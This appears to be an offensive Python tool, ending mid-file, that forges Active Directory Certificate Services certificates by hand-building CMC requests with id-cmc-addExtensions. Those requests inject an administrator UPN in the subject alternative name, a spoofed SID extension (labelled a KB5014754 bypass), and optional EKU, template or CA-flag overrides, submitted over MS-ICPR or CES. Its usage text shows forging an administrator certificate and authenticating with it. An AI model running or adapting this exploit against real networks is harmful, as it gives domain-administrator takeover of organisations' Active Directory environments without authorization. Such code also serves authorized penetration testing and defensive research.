#!/usr/bin/env python3
"""
cmc_addext.py - forge an AD CS certificate through CMC id-cmc-addExtensions.

I build the CMC by hand: a plain CSR wrapped in a signed CMS with an
id-cmc-addExtensions control, and I graft a SAN (and, if I want, the
szOID_NTDS_CA_SECURITY_EXT SID) straight onto the issued cert. On an
ESC1-shaped template submitted over MS-ICPR that gets me a cert whose SAN and
SID both say administrator, on a fully patched CA + DC. certsrv.exe never runs
the extension through an allowlist, and the CMC signer only needs any cert the
CA itself issued, so --auto-signer just enrolls a throwaway to sign with.

Needs an ESC1 template (ENROLLEE_SUPPLIES_SUBJECT, clientAuth EKU, low-priv
enroll, no REQUIRE_UPN) and RPC to the CA on 135. CES is optional.

    python3 cmc_addext.py --auto-signer \
        --ca-host <ca> --ca-name <CA-NAME> --template <ESC1_TEMPLATE> \
        --inject-upn administrator@<domain> \
        --dc-ip <dc> --dc-user <low_user> --dc-pass '<pass>' \
        --out forged_admin.pfx --pfx-pass addext

    python3 verify_cert_sid.py forged_admin.pfx addext
    certipy auth -pfx forged_admin.pfx -password addext -dc-ip <dc> \
        -domain <domain> -username administrator

--inject-sid is resolved from AD when --dc-ip/--dc-pass are given; pass it to
override. CES mode works too via --cert/--key/--ces-url.

Mohamed Alzhrani (@0xmaz) - https://0xmaz.me
For authorized testing only. You break it into a network you don't own, that's on you.
"""

import argparse
import base64
import hashlib
import os
import re
import struct
import sys
import uuid
import datetime

import requests
import urllib3
import ldap3

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.serialization import pkcs12
from cryptography.x509.oid import NameOID, ObjectIdentifier
from cryptography.x509 import DNSName, RFC822Name, OtherName
from cryptography.hazmat.backends import default_backend

urllib3.disable_warnings()

# Raw DER encoding helpers

def _encode_length(n):
    if n < 0x80:
        return bytes([n])
    elif n < 0x100:
        return bytes([0x81, n])
    elif n < 0x10000:
        return bytes([0x82, (n >> 8) & 0xff, n & 0xff])
    else:
        return bytes([0x83, (n >> 16) & 0xff, (n >> 8) & 0xff, n & 0xff])

def der_tlv(tag, content):
    return bytes([tag]) + _encode_length(len(content)) + content

def der_seq(content):
    return der_tlv(0x30, content)

def der_set(content):
    return der_tlv(0x31, content)

def der_ctx_constructed(tag_num, content):
    """[tag_num] EXPLICIT/IMPLICIT constructed (used for explicit context tags)."""
    return der_tlv(0xa0 | tag_num, content)

def der_ctx_primitive(tag_num, content):
    """[tag_num] primitive (used for implicit primitive context tags)."""
    return der_tlv(0x80 | tag_num, content)

def der_int(n):
    if n == 0:
        return der_tlv(0x02, b'\x00')
    b = []
    while n > 0:
        b.append(n & 0xff)
        n >>= 8
    b.reverse()
    if b[0] & 0x80:
        b = [0x00] + b
    return der_tlv(0x02, bytes(b))

def der_bool(v):
    return der_tlv(0x01, b'\xff' if v else b'\x00')

def der_octet(data):
    return der_tlv(0x04, data)

def der_bitstr(data, unused_bits=0):
    return der_tlv(0x03, bytes([unused_bits]) + data)

def der_utf8str(s):
    return der_tlv(0x0c, s.encode('utf-8'))

def der_ia5str(s):
    return der_tlv(0x16, s.encode('ascii'))

def der_null():
    return b'\x05\x00'

def encode_oid_arc(arc):
    """Encode a single OID arc in base-128."""
    if arc == 0:
        return b'\x00'
    b = []
    while arc > 0:
        b.append((arc & 0x7f) | (0x80 if b else 0x00))
        arc >>= 7
    b.reverse()
    b[-1] &= 0x7f  # clear MSB on last byte
    return bytes(b)

def der_oid(oid_str):
    """Encode OID string like '1.2.840.113549.1.7.2' to DER."""
    arcs = [int(x) for x in oid_str.split('.')]
    # First two arcs encoded as 40*a0 + a1
    first = 40 * arcs[0] + arcs[1]
    content = encode_oid_arc(first)
    for arc in arcs[2:]:
        content += encode_oid_arc(arc)
    return der_tlv(0x06, content)

# OID constants
OID_SIGNED_DATA      = '1.2.840.113549.1.7.2'
OID_DATA             = '1.2.840.113549.1.7.1'
OID_CT_PKIDATA       = '1.3.6.1.5.5.7.12.2'   # id-ct-PKIData (CMC full)
OID_CMC_ADD_EXT      = '1.3.6.1.5.5.7.7.8'    # id-cmc-addExtensions
OID_SAN              = '2.5.29.17'             # subjectAltName
OID_SHA256           = '2.16.840.1.101.3.4.2.1'
OID_RSA_SHA256       = '1.2.840.113549.1.1.11' # sha256WithRSAEncryption
OID_UPN              = '1.3.6.1.4.1.311.20.2.3' # id-ms-upn
OID_PKCS9_CONTENT_TYPE = '1.2.840.113549.1.9.3'
OID_PKCS9_MESSAGE_DIGEST = '1.2.840.113549.1.9.4'
OID_NTDS_SID = '1.3.6.1.4.1.311.25.2'     # szOID_NTDS_CA_SECURITY_EXT (KB5014754)
OID_EKU              = '2.5.29.37'             # extendedKeyUsage
OID_CERT_REQ_AGENT   = '1.3.6.1.4.1.311.20.2.1' # Certificate Request Agent (Enrollment Agent)
OID_CMC_ADD_ATTR     = '1.3.6.1.4.1.311.10.10.1' # szOID_CMC_ADD_ATTRIBUTES (Microsoft CMC extension)
OID_ENROLLMENT_NVP   = '1.3.6.1.4.1.311.13.2.1'  # szOID_ENROLLMENT_NAME_VALUE_PAIR
OID_BASIC_CONSTRAINTS = '2.5.29.19'              # basicConstraints
OID_KEY_USAGE        = '2.5.29.15'              # keyUsage

# Build SAN extension DER with UPN OtherName

def build_upn_san_der(upn_str):
    """
    Build DER for SubjectAltName containing UPN OtherName.
    Returns the raw SAN value bytes (content of OCTET STRING in Extension).
    """
    # UPN value: UTF8String
    upn_utf8 = der_utf8str(upn_str)
    # [0] EXPLICIT ANY { UTF8String } - OtherName.value
    explicit_val = der_ctx_constructed(0, upn_utf8)
    # OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }
    other_name_content = der_oid(OID_UPN) + explicit_val
    other_name = der_seq(other_name_content)
    # GeneralName otherName [0] IMPLICIT OtherName
    # Since OtherName is SEQUENCE (constructed), [0] IMPLICIT = [0] constructed
    gen_name = der_ctx_constructed(0, other_name_content)
    # SubjectAltName ::= SEQUENCE OF GeneralName
    san = der_seq(gen_name)
    return san

# Build AddExtensionsReq attribute value

def build_add_extensions_req(body_part_id_ref, cert_body_part_ids, extensions_der_list):
    """
    Build AddExtensionsReq ::= SEQUENCE {
        pkiDataReference  BodyPartID,
        certReferences    SEQUENCE OF BodyPartID,
        extensions        SEQUENCE OF Extension
    }
    """
    pki_data_ref = der_int(body_part_id_ref)

    cert_refs_content = b''
    for bpid in cert_body_part_ids:
        cert_refs_content += der_int(bpid)
    cert_refs = der_seq(cert_refs_content)

    exts_content = b''
    for ext_der in extensions_der_list:
        exts_content += ext_der
    extensions = der_seq(exts_content)

    return der_seq(pki_data_ref + cert_refs + extensions)


def build_nvp_enrollment_pair(name_str, value_str):
    """
    Build EnrollmentNameValuePair ::= SEQUENCE { BMPString name, BMPString value }

    Decoded by CryptDecodeObject(1, szOID_ENROLLMENT_NAME_VALUE_PAIR, ...) in certsrv.exe
    FUN_14002d5c8 -> FUN_14002a738 -> FUN_1400464d0 -> SetRequestProperty(name, 0x4104, value)
    """
    name_bytes  = name_str.encode('utf-16-be')
    value_bytes = value_str.encode('utf-16-be')
    return der_seq(
        der_tlv(0x1e, name_bytes) +   # BMPString name
        der_tlv(0x1e, value_bytes)    # BMPString value
    )


def build_add_attributes_req(body_part_id_ref, cert_body_part_ids, nvp_pairs):
    """
    Build CMC_ADD_ATTRIBUTES_INFO ::= SEQUENCE {
        pkiDataReference  INTEGER,
        certReferences    SEQUENCE OF INTEGER,
        attributes        SEQUENCE OF Attribute
    }

    Where each Attribute ::= SEQUENCE { OID, SET OF AttributeValue }
    and each AttributeValue (for szOID_ENROLLMENT_NAME_VALUE_PAIR) is an EnrollmentNameValuePair.

    nvp_pairs: list of (name_str, value_str) tuples.

    Cert-ref matching in FUN_140030a30: param_3 (CSR bodyPartID) must appear in certReferences
    and pkiDataReference must be 0. Mirrors the ADD_EXTENSIONS structure exactly.
    """
    pki_data_ref = der_int(body_part_id_ref)

    cert_refs_content = b''
    for bpid in cert_body_part_ids:
        cert_refs_content += der_int(bpid)
    cert_refs = der_seq(cert_refs_content)

    attrs_content = b''
    for name_str, value_str in nvp_pairs:
        nvp_encoded = build_nvp_enrollment_pair(name_str, value_str)
        attribute = der_seq(
            der_oid(OID_ENROLLMENT_NVP) +
            der_set(nvp_encoded)
        )
        attrs_content += attribute
    # PKCS#9: Attributes ::= SET OF Attribute  (SET tag 0x31, not SEQUENCE 0x30)
    attributes = der_set(attrs_content)

    return der_seq(pki_data_ref + cert_refs + attributes)


def build_san_extension(upn_str):
    """
    Build Extension ::= SEQUENCE {
        extnID    OID,
        critical  BOOLEAN OPTIONAL,
        extnValue OCTET STRING
    }
    for subjectAltName with UPN.
    """
    san_der = build_upn_san_der(upn_str)
    # extnValue = OCTET STRING containing the DER of the extension value
    ext_value = der_octet(san_der)
    # critical = FALSE (omit for non-critical)
    return der_seq(der_oid(OID_SAN) + ext_value)

# Build EKU extension DER

def build_eku_extension(oid_list, critical=False):
    """
    Build Extension ::= SEQUENCE {
        extnID    OID (2.5.29.37 extKeyUsage),
        critical  BOOLEAN OPTIONAL,
        extnValue OCTET STRING containing SEQUENCE OF OID
    }
    oid_list: list of OID strings to include in EKU extension.
    """
    # ExtKeyUsageSyntax ::= SEQUENCE SIZE (1..MAX) OF KeyPurposeId
    eku_content = b''
    for oid in oid_list:
        eku_content += der_oid(oid)
    eku_value = der_seq(eku_content)
    ext_parts = der_oid(OID_EKU)
    if critical:
        ext_parts += der_bool(True)
    ext_parts += der_octet(eku_value)
    return der_seq(ext_parts)

# Application Policies extension (1.3.6.1.4.1.311.21.10)

OID_APP_POLICIES = '1.3.6.1.4.1.311.21.10'   # szOID_APPLICATION_CERT_POLICIES

def build_app_policies_extension(oid_list, critical=False):
    """
    ApplicationCertPolicies ::= SEQUENCE OF PolicyInformation
    PolicyInformation ::= SEQUENCE { policyIdentifier OID }
    Encodes as Extension { extnID=1.3.6.1.4.1.311.21.10, extnValue=OCTET STRING { SEQUENCE OF SEQUENCE { OID } } }
    """
    policies = b''
    for oid in oid_list:
        policies += der_seq(der_oid(oid))
    ext_value = der_seq(policies)
    ext_parts = der_oid(OID_APP_POLICIES)
    if critical:
        ext_parts += der_bool(True)
    ext_parts += der_octet(ext_value)
    return der_seq(ext_parts)

# SID extension helpers (KB5014754 bypass)

def sid_str_to_binary(sid_str: str) -> bytes:
    """Convert 'S-1-5-21-X-Y-Z-RID' to binary SID bytes."""
    parts = sid_str.split('-')
    rev = int(parts[1])
    authority = int(parts[2])
    subs = [int(p) for p in parts[3:]]
    data = bytes([rev, len(subs)]) + authority.to_bytes(6, 'big')
    for s in subs:
        data += s.to_bytes(4, 'little')
    return data

def sid_binary_to_str(sid_binary: bytes) -> str:
    """Convert raw binary SID bytes to 'S-1-5-21-...' string."""
    import struct
    rev = sid_binary[0]
    n_sub = sid_binary[1]
    auth = int.from_bytes(sid_binary[2:8], 'big')
    subs = [struct.unpack_from('<I', sid_binary, 8 + i * 4)[0] for i in range(n_sub)]
    return f"S-{rev}-{auth}-" + "-".join(str(s) for s in subs)


def build_basic_constraints_extension(is_ca=True, path_len=None, critical=True):
    """
    Build Extension for basicConstraints (2.5.29.19).
    BasicConstraints ::= SEQUENCE { cA BOOLEAN OPTIONAL, pathLenConstraint INTEGER OPTIONAL }
    """
    bc_content = b''
    if is_ca:
        bc_content += der_bool(True)  # cA = TRUE
    if path_len is not None:
        bc_content += der_tlv(0x02, path_len.to_bytes(1, 'big'))  # INTEGER
    bc_value = der_seq(bc_content)
    ext_parts = der_oid(OID_BASIC_CONSTRAINTS)
    if critical:
        ext_parts += der_bool(True)
    ext_parts += der_octet(bc_value)
    return der_seq(ext_parts)

def build_key_usage_extension(bits, critical=True):
    """
    Build Extension for keyUsage (2.5.29.15).
    bits: integer bitmask (MSB first, bit 0 = digitalSignature):
      bit 0 = digitalSignature, bit 2 = keyEncipherment, bit 5 = keyCertSign, bit 6 = cRLSign
    E.g. keyCertSign + cRLSign + digitalSignature = 0b10000110 = 0x86 -> value byte 0x06 with unused=1
    RFC 5280: KeyUsage ::= BIT STRING { digitalSignature(0), nonRepudiation(1), keyEncipherment(2),
      dataEncipherment(3), keyAgreement(4), keyCertSign(5), cRLSign(6), encipherOnly(7), decipherOnly(8) }
    """
    # bits is a byte where bit7=digitalSignature..bit2=keyCertSign..bit1=cRLSign
    # Encode as BIT STRING: 03 <len> <unused_bits> <data>
    if bits > 0x7f:
        # Two bytes needed
        b1 = bits & 0xff
        b2 = (bits >> 8) & 0xff
        # count trailing zeros in little-endian bit order
        unused = 0
        tmp = b1
        if tmp == 0:
            unused = 8
        else:
            while (tmp & 1) == 0:
                unused += 1
                tmp >>= 1
        bit_val = bytes([unused, b1, b2])
    else:
        unused = 0
        tmp = bits
        if tmp == 0:
            unused = 8
        else:
            while (tmp & 1) == 0:
                unused += 1
                tmp >>= 1
        bit_val = bytes([unused, bits & 0xff])
    ku_value = der_tlv(0x03, bit_val)
    ext_parts = der_oid(OID_KEY_USAGE)
    if critical:
        ext_parts += der_bool(True)
    ext_parts += der_octet(ku_value)
    return der_seq(ext_parts)

def build_ntds_sid_ext_value(sid_binary: bytes) -> bytes:
    """
    Build extension VALUE for szOID_NTDS_CA_SECURITY_EXT.

    CORRECT format - verified against cert issued by patched certca.dll v1911:
      SEQUENCE {
        [0] {
          OID 1.3.6.1.4.1.311.25.2.1   (szOID_NTDS_OBJECTSID)
          [0] {
            OCTET STRING "S-1-5-21-..."  <- ASCII SID string, NOT binary bytes
          }
        }
      }

    Previous bugs:
    - v1: had outer [0] but binary SID  -> KRB_ERR_GENERIC (KDC can't parse)
    - v2: removed outer [0], still binary -> KRB_ERR_GENERIC + certipy parse fail
    - v3 (this): outer [0] restored + ASCII string -> matches patched CA output exactly
    """
    sid_str = sid_binary_to_str(sid_binary)
    sid_ascii = sid_str.encode('ascii')
    oid_bytes = bytes([0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x19, 0x02, 0x01])
    oid_der = der_tlv(0x06, oid_bytes)
    ctx0_sid = der_ctx_constructed(0, der_octet(sid_ascii))   # [0] { OCTET_STRING(ASCII) }
    ctx0_outer = der_ctx_constructed(0, oid_der + ctx0_sid)   # [0] { OID [0] { ... } }
    return der_seq(ctx0_outer)

def build_sid_x509_extension(sid_binary: bytes) -> bytes:
    """Build full X.509 Extension DER for szOID_NTDS_CA_SECURITY_EXT."""
    ext_value = build_ntds_sid_ext_value(sid_binary)
    return der_seq(der_oid(OID_NTDS_SID) + der_octet(ext_value))

# Build PKIData

def build_pkidata(csr_der, upn_str, sid_binary=None, inject_eku=None, inject_template=None, inject_app_policies=None, inject_userdn=None, inject_ca_cert=False):
    """
    Build PKIData ::= SEQUENCE {
        controlSequence   SEQUENCE SIZE(0..MAX) OF TaggedAttribute,
        reqSequence       SEQUENCE SIZE(0..MAX) OF TaggedRequest,
        cmsSequence       SEQUENCE SIZE(0..MAX) OF TaggedContentInfo,
        otherMsgSequence  SEQUENCE SIZE(0..MAX) OF OtherMsg
    }
    NOTE: RFC 5272 defines these as plain SEQUENCE types - NO context tags [0]-[3].

    inject_eku: optional list of OID strings to inject as an EKU extension via CMC-ADDEXT.
    inject_template: optional template name to inject via szOID_CMC_ADD_ATTRIBUTES NVP.
      Calls SetRequestProperty("CertificateTemplate", 0x4104, value) via FUN_14002d5c8 ->
      FUN_14002a738 -> FUN_1400464d0 BEFORE certca.dll VerifyRequest runs, potentially
      switching the template that the policy module applies for UPN/DNS stamp logic.
    """
    CSR_BODY_PART_ID = 2
    CTRL_BODY_PART_ID = 1

    # Build extension list
    extensions = []

    # SAN: only add when upn_str is provided (skip in EKU-only / EA-cert mode)
    if upn_str:
        san_ext = build_san_extension(upn_str)
        extensions.append(san_ext)
    if sid_binary is not None:
        extensions.append(build_sid_x509_extension(sid_binary))
        print(f"[*] SID extension added ({len(sid_binary)} bytes binary SID)")
    if inject_eku:
        extensions.append(build_eku_extension(inject_eku))
        print(f"[*] EKU extension injected via CMC-ADDEXT: {inject_eku}")
    if inject_app_policies:
        extensions.append(build_app_policies_extension(inject_app_policies))
        print(f"[*] Application Policies extension injected via CMC-ADDEXT: {inject_app_policies}")
    if inject_ca_cert:
        extensions.append(build_basic_constraints_extension(is_ca=True, path_len=0, critical=True))
        # keyCertSign=bit5, cRLSign=bit6, digitalSignature=bit0 in RFC 5280 bit order
        # Encoded byte: bit0=MSB -> digitalSig=0x80, keyCertSign=0x04, cRLSign=0x02 -> 0x86
        extensions.append(build_key_usage_extension(bits=0x86, critical=True))
        print(f"[*] CA cert extensions injected: basicConstraints CA:TRUE pathLen:0 + keyUsage keyCertSign+cRLSign+digitalSignature")

    ctrl_attrs = b''

    # TaggedAttribute 1: id-cmc-addExtensions (only when there are extensions to inject)
    if extensions:
        add_ext_req = build_add_extensions_req(0, [CSR_BODY_PART_ID], extensions)
        tagged_attr_ext = der_seq(
            der_int(CTRL_BODY_PART_ID) +
            der_oid(OID_CMC_ADD_EXT) +
            der_set(add_ext_req)
        )
        ctrl_attrs += tagged_attr_ext

    # TaggedAttribute 2: szOID_CMC_ADD_ATTRIBUTES with NVP CertificateTemplate override
    # FUN_140030a30 -> FUN_14002d5c8 -> FUN_14002a738 -> SetRequestProperty(0x4104) OVERWRITE
    # Cert-ref matching: pkiDataReference=0, certReferences=[CSR_BODY_PART_ID]
    if inject_template or inject_userdn:
        nvp_pairs = []
        if inject_template:
            nvp_pairs.append(("CertificateTemplate", inject_template))
        if inject_userdn:
            nvp_pairs.append(("UserDN", inject_userdn))
        add_attr_req = build_add_attributes_req(
            0, [CSR_BODY_PART_ID],
            nvp_pairs
        )
        # bodyPartID must be unique across ALL PKIData elements (RFC 5272 §2).
        # CTRL_BODY_PART_ID=1, CSR_BODY_PART_ID=2 -> use 3 for ADD_ATTRIBUTES.
        ADDATTR_BODY_PART_ID = 3
        tagged_attr_nvp = der_seq(
            der_int(ADDATTR_BODY_PART_ID) +
            der_oid(OID_CMC_ADD_ATTR) +
            der_set(add_attr_req)
        )
        ctrl_attrs += tagged_attr_nvp
        if inject_template:
            print(f"[*] Template NVP injection via CMC-ADD-ATTRIBUTES: CertificateTemplate={inject_template!r}")
        if inject_userdn:
            print(f"[*] UserDN NVP injection via CMC-ADD-ATTRIBUTES: UserDN={inject_userdn!r}")

    # controlSequence: plain SEQUENCE OF TaggedAttribute (RFC 5272 - no context tag)
    ctrl_seq = der_seq(ctrl_attrs)

    # TaggedRequest CHOICE tcr [0] IMPLICIT TaggedCertificationRequest
    # TaggedCertificationRequest is SEQUENCE -> [0] IMPLICIT CONSTRUCTED = 0xa0 replaces 0x30
    tagged_req = der_ctx_constructed(0, der_int(CSR_BODY_PART_ID) + csr_der)

    # reqSequence: plain SEQUENCE OF TaggedRequest (RFC 5272 - no context tag)
    req_seq = der_seq(tagged_req)

    # cmsSequence: plain SEQUENCE OF TaggedContentInfo (empty)
    cms_seq = der_seq(b'')

    # otherMsgSequence: plain SEQUENCE OF OtherMsg (empty)
    other_seq = der_seq(b'')

    pki_data_content = ctrl_seq + req_seq + cms_seq + other_seq
    return der_seq(pki_data_content)

# Build outer SignedData wrapping PKIData

def build_signed_cmc(pki_data_der, signer_cert, signer_key):
    """
    Build CMS SignedData with:
    - contentType = id-ct-PKIData
    - content = PKIData
    - signer = signer_cert / signer_key
    """
    # encapContentInfo
    # Windows CryptMsgGetParam(CMSG_CONTENT_PARAM) for non-data types returns the raw
    # content of the [0] wrapper (including OCTET STRING tag+len if present).
    # RFC 5652: eContent [0] EXPLICIT OCTET STRING containing the PKIData DER.
    # Windows CryptMsgGetParam(CMSG_CONTENT_PARAM) returns the OCTET STRING verbatim
    # (including 04 len header) for non-data content types. FUN_1400282d8 strips it.
    inner_octet = der_tlv(0xa0, der_octet(pki_data_der))
    encap_content_info = der_seq(
        der_oid(OID_CT_PKIDATA) +
        inner_octet
    )

    # Compute message digest over the PKIData DER content
    # For signedAttrs, we sign the content of eContent (PKIData DER)
    digest = hashlib.sha256(pki_data_der).digest()

    # signedAttrs (authenticated attributes)
    attr_content_type = der_seq(
        der_oid(OID_PKCS9_CONTENT_TYPE) +
        der_set(der_oid(OID_CT_PKIDATA))
    )
    attr_msg_digest = der_seq(
        der_oid(OID_PKCS9_MESSAGE_DIGEST) +
        der_set(der_octet(digest))
    )
    # SignedAttrs SET OF Attribute (encoded as SET for signing)
    signed_attrs_set = der_set(attr_content_type + attr_msg_digest)
    # For signing: the SET bytes are signed (with tag 0x31)
    signed_attrs_to_sign = signed_attrs_set

    # Sign the signedAttrs
    from cryptography.hazmat.primitives.asymmetric import padding as apadding
    signature = signer_key.sign(
        signed_attrs_to_sign,
        apadding.PKCS1v15(),
        hashes.SHA256()
    )

    # SignerInfo
    cert_serial = signer_cert.serial_number
    issuer_der = signer_cert.issuer.public_bytes()

    # IssuerAndSerialNumber
    issuer_and_serial = der_seq(issuer_der + der_int(cert_serial))

    # SignerInfo ::= SEQUENCE {
    #   version, sid, digestAlgorithm, signedAttrs [0] IMPLICIT, signatureAlgorithm, signature, unsignedAttrs }
    signer_info = der_seq(
        der_int(1) +                         # version = 1
        issuer_and_serial +                  # sid
        der_seq(der_oid(OID_SHA256) + der_null()) +  # digestAlgorithm
        der_tlv(0xa0, attr_content_type + attr_msg_digest) +  # [0] IMPLICIT signedAttrs
        der_seq(der_oid(OID_RSA_SHA256) + der_null()) +       # signatureAlgorithm
        der_octet(signature)                 # signature
    )

    # Include signer cert in certificates [0] IMPLICIT CertificateSet
    signer_cert_der = signer_cert.public_bytes(serialization.Encoding.DER)
    certificates = der_tlv(0xa0, signer_cert_der)

    # digestAlgorithms SET OF AlgorithmIdentifier
    digest_algos = der_set(der_seq(der_oid(OID_SHA256) + der_null()))

    # SignedData ::= SEQUENCE {
    #   version, digestAlgorithms, encapContentInfo, certificates [0], crls [1], signerInfos }
    signed_data_content = (
        der_int(3) +           # version = 3 (RFC 5652: MUST be 3 when eContentType != id-data)
        digest_algos +
        encap_content_info +
        certificates +
        der_set(signer_info)   # signerInfos
    )
    signed_data = der_seq(signed_data_content)

    # ContentInfo ::= SEQUENCE { contentType OID, content [0] EXPLICIT ANY }
    content_info = der_seq(
        der_oid(OID_SIGNED_DATA) +
        der_ctx_constructed(0, signed_data)
    )
    return content_info

# Build the minimal CSR (no SAN in CSR - extensions come via CMC)

def build_plain_csr(subject_cn, new_key):
    """Build a basic PKCS#10 CSR with no extensions."""
    subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, subject_cn)])
    csr = (
        x509.CertificateSigningRequestBuilder()
        .subject_name(subject)
        .sign(new_key, hashes.SHA256())
    )
    return csr.public_bytes(serialization.Encoding.DER)

# CES SOAP submission

def build_ces_soap(ces_url, cmc_b64, template_name):
    msg_id = "urn:uuid:" + str(uuid.uuid4())
    return (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<s:Envelope xmlns:a="http://www.w3.org/2005/08/addressing"'
        ' xmlns:s="http://www.w3.org/2003/05/soap-envelope">\n'
        '  <s:Header>\n'
        '    <a:Action s:mustUnderstand="1">'
        'http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep'
        '</a:Action>\n'
        f'    <a:MessageID>{msg_id}</a:MessageID>\n'
        '    <a:ReplyTo><a:Address>'
        'http://www.w3.org/2005/08/addressing/anonymous'
        '</a:Address></a:ReplyTo>\n'
        f'    <a:To s:mustUnderstand="1">{ces_url}</a:To>\n'
        '  </s:Header>\n'
        '  <s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"'
        ' xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n'
        '    <RequestSecurityToken xmlns="http://docs.oasis-open.org/ws-sx/ws-trust/200512">\n'
        '      <TokenType>'
        'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3'
        '</TokenType>\n'
        '      <RequestType>'
        'http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue'
        '</RequestType>\n'
        '      <BinarySecurityToken'
        ' ValueType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#PKCS7"'
        ' EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary"'
        ' xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">'
        f'{cmc_b64}'
        '</BinarySecurityToken>\n'
        '      <RequestID xsi:nil="true"'
        ' xmlns="http://schemas.microsoft.com/windows/pki/2009/01/enrollment"/>\n'
        '      <ac:AdditionalContext xmlns:ac="http://schemas.xmlsoap.org/ws/2006/12/authorization">'
        f'<ac:ContextItem Name="CertificateTemplate"><ac:Value>{template_name}</ac:Value></ac:ContextItem>'
        '</ac:AdditionalContext>\n'
        '    </RequestSecurityToken>\n'
        '  </s:Body>\n'
        '</s:Envelope>'
    )

# RPC (MS-ICPR) plain PKCS#10 enrollment - used for auto-signer

def rpc_enroll_pkcs10(ca_host: str, ca_name: str, domain: str,
                      username: str, password: str,
                      csr_der: bytes, template_name: str) -> bytes:
    """
    Enroll a plain PKCS#10 CSR via MS-ICPR and return the issued cert DER.
    dwFlags = CRYPT_ASN_ENCODING (0x1) - plain DER, no CMC wrapper.
    Used by --auto-signer to get a throwaway signing cert on the fly.
    """
    from impacket.dcerpc.v5 import transport, icpr
    from impacket.dcerpc.v5.nrpc import checkNullString
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    CRYPT_ASN_ENCODING = 0x00000001

    stringbinding = f"ncacn_np:{ca_host}[\\pipe\\cert]"
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_credentials(username, password, domain, '', '', '')

    dce = rpctransport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(icpr.MSRPC_UUID_ICPR)

    attrib_str = f"CertificateTemplate:{template_name}"
    attribs_enc = checkNullString(attrib_str).encode("utf-16le")
    pctb_attribs = icpr.CERTTRANSBLOB()
    pctb_attribs["cb"] = len(attribs_enc)
    pctb_attribs["pb"] = attribs_enc

    pctb_request = icpr.CERTTRANSBLOB()
    pctb_request["cb"] = len(csr_der)
    pctb_request["pb"] = csr_der

    req = icpr.CertServerRequest()
    req["dwFlags"]       = CRYPT_ASN_ENCODING   # 0x1 - plain PKCS#10 DER
    req["pwszAuthority"] = checkNullString(ca_name)
    req["pdwRequestId"]  = 0
    req["pctbAttribs"]   = pctb_attribs
    req["pctbRequest"]   = pctb_request

    resp = dce.request(req)
    dce.disconnect()

    disposition = resp["pdwDisposition"]
    if disposition != 3:
        msg = b"".join(resp["pctbDispositionMessage"]["pb"]).decode("utf-16le", errors="replace")
        raise RuntimeError(f"Auto-signer enrollment failed: disposition={disposition} msg={msg!r}")

    return b"".join(resp["pctbEncodedCert"]["pb"])

# RPC (MS-ICPR) submission - no CES required

def rpc_submit_cmc(ca_host: str, ca_name: str, domain: str,
                   username: str, password: str,
                   cmc_der: bytes, template_name: str) -> bytes:
    """
    Submit a CMC request directly via MS-ICPR (ncacn_np:\\pipe\\cert).
    No CES/CEP web enrollment required - works against any standard CA.

    dwFlags = CR_IN_CMC (0x400) | CRYPT_ASN_ENCODING (0x1) = 0x401
    """
    from impacket.dcerpc.v5 import transport, icpr
    from impacket.dcerpc.v5.nrpc import checkNullString
    from impacket.dcerpc.v5.ndr import NDRSTRUCT

    CR_IN_CMC          = 0x00000400
    CRYPT_ASN_ENCODING = 0x00000001

    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY

    stringbinding = f"ncacn_np:{ca_host}[\\pipe\\cert]"
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_credentials(username, password, domain, '', '', '')

    dce = rpctransport.get_dce_rpc()
    dce.set_auth_type(RPC_C_AUTHN_WINNT)
    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(icpr.MSRPC_UUID_ICPR)

    # Build attributes: template name
    attrib_str = f"CertificateTemplate:{template_name}"
    attribs_enc = checkNullString(attrib_str).encode("utf-16le")

    pctb_attribs = icpr.CERTTRANSBLOB()
    pctb_attribs["cb"] = len(attribs_enc)
    pctb_attribs["pb"] = attribs_enc

    pctb_request = icpr.CERTTRANSBLOB()
    pctb_request["cb"] = len(cmc_der)
    pctb_request["pb"] = cmc_der

    req = icpr.CertServerRequest()
    req["dwFlags"]       = CR_IN_CMC | CRYPT_ASN_ENCODING  # 0x401 - CMC + DER
    req["pwszAuthority"] = checkNullString(ca_name)
    req["pdwRequestId"]  = 0
    req["pctbAttribs"]   = pctb_attribs
    req["pctbRequest"]   = pctb_request

    resp = dce.request(req)
    dce.disconnect()

    disposition = resp["pdwDisposition"]
    req_id      = resp["pdwRequestId"]
    disp_map    = {2: "CR_DISP_DENIED", 3: "CR_DISP_ISSUED", 4: "CR_DISP_ISSUED_OUT_OF_BAND",
                   5: "CR_DISP_UNDER_SUBMISSION", 6: "CR_DISP_INCOMPLETE"}
    print(f"[*] RPC disposition: {disp_map.get(disposition, hex(disposition))} (requestId={req_id})")

    if disposition != 3:
        msg = b"".join(resp["pctbDispositionMessage"]["pb"]).decode("utf-16le", errors="replace")
        raise RuntimeError(f"CA rejected request: disposition={disposition} msg={msg!r}")

    return b"".join(resp["pctbEncodedCert"]["pb"])

def extract_cert_from_response(resp_text):
